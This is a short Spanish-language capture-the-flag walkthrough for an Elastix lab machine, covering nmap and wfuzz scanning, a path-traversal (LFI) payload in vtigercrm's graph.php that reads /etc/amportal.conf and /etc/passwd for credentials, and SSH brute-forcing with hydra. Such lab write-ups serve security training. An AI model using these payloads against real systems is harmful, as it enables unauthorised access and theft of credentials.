![Image text]()

## Linux - Easy
IP = 10.10.10.7

### USER ###

*** 
Ejecutamos nmap 
    
    nmap 10.10.10.7 -p- --open --min-rate 5000 -vv -n -Pn -oG allPorts
    
![Image text]()

    nmap 10.10.10.7 -sC -sV -p80  -oN targeted

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/shocker/targeted.jpg)

Detectamos un apache, openssh, smtp, imap, ssl 
Revisamos la pagina web vemos que es un elastix (https://es.wikipedia.org/wiki/Elastix)

![Image text]()

realizamos un scaneo de directorios en busca de algo mas de información

    wfuzz -c -t 400 --hc=404 --hh=1785 -L -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.7/FUZZ/
            
![Image text]()

Detectamos varias paginas entre ellas admin accedemos e intentamos conectar con las password por defecto y no funciona.
Buscamos informacion sobre Elastix y encontramos una vulnerabilidad LFI 
(https://www.exploit-db.com/exploits/37637)

    /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
    
Lo ejecutamos y vemos que nos muestra unas credenciales.

probamos a ver /etc/passwd para ver los usuarios que tienen bash e intentar conectar con ellos

     /vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action

Sacamos el listado de usuarios y lanzamos hydra para ver si nos conecta por ssh con las credenciales obtenidas.



Accemos con root por ssh

conseguimos la flag de user.txt

conseguimos la flag de root.txt




